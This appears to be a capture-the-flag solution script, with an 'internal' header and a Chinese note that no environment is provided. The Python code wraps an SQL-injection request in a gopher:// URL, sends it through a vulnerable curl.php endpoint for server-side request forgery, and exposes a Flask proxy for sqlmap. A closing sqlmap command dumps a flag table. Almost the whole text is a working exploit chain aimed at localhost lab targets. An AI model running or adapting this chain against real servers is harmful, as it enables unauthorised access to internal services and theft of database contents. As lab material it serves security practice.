## internal

不提供环境
```python
import requests
from flask import Flask, request
from urllib.parse import quote

http_package_template = '''POST /sqli.php HTTP/1.1\r\nHost: localhost:2333\r\nContent-Length: CONTENT_LENGTH\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: curl/7.74.0\r\nAccept: */*\r\n\r\nPAYLOAD_HERE'''

def fuck(id: str):
    global http_package_template
    payload = f'id={quote(id)}'
    http_package = http_package_template.replace('CONTENT_LENGTH', str(len(payload))).replace('PAYLOAD_HERE', payload)
    gopher_url = f'gopher://localhost:80/_{quote(http_package)}'
    r = requests.post('http://localhost:2333/curl.php', data={'url': gopher_url})
    print(r.text)
    return r.text

def proxy():
    app = Flask(__name__)
    @app.route('/', methods=['GET', 'POST'])
    def index():
        id = request.form.get('id').replace(' ', '\x0d')
        return fuck(id).split('\n')[-1]
    app.run('0.0.0.0', 1337, debug=True)

if __name__ == '__main__':
    proxy()
# sqlmap -u http://localhost:1337 --data 'id=1' --dbms=mysql --technique=B -v3 -D rua -T flag --dump
```

